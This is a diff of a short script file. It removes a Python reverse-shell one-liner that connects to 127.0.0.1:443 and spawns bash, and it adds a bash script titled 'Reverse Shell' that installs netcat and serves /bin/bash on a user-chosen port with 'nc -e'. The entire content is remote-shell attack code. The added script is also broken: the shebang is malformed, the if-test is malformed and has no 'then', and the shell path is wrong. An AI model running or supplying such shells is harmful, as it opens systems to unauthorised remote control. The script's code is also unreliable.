@@ -1,1 +1,30 @@
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+#!bin/bash
+
+#Reverse Shell by: MIN1 LIP3ZIN :(
+clear
+
+#echo "###########"
+#echo "MIN1 LIP3ZIN"
+#echo "##########"
+
+read  -p  "select port: "    port
+find /etc/nc
+
+if [ $? == 1]
+
+       apt-get  install  netcat
+        clear
+        nc  -vld $port -e  "bin/bash"
+
+        clear
+
+clear
+
+else
+ nc  -vlp  $port  -e  "bin/bash"$
+
+clear
+
+      clear
+
+fi
